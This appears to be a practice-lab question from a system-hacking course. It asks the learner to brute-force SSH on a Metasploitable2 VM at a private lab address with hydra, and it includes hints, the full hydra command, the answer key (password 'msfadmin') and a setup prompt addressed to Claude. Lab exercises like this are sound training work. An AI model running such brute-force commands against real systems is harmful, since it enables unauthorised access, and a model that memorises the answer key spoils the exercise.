# Q050 — Hydra SSH Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Bruteforce SSH on Metasploitable for user `msfadmin` using a small wordlist. Report the **discovered password**.

---

## 🎯 Flag Format

```
ssh_pass=<word>
```

Example: `ssh_pass=msfadmin`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<ip>` (or smaller list).
</details>

<details>
<summary>Hint 2</summary>

msfadmin password equals username.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ssh://192.168.52.129
```

Hydra cracks `msfadmin:msfadmin`.

**Answer:** `ssh_pass=msfadmin`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q050:
1. Verify Metasploitable2 (192.168.52.129) up; ssh running (sudo service ssh status).
2. From Parrot: nmap -p 22 192.168.52.129 — open. Confirm msfadmin user exists (default).
3. Ensure rate limiting not too tight — default Metasploitable2 sshd_config allows brute.
4. Wordlist present: ls /usr/share/wordlists/fasttrack.txt.

Report back: "Lab ready for Q050 — SSH 22 open on 192.168.52.129, hydra + fasttrack wordlist ready".
```
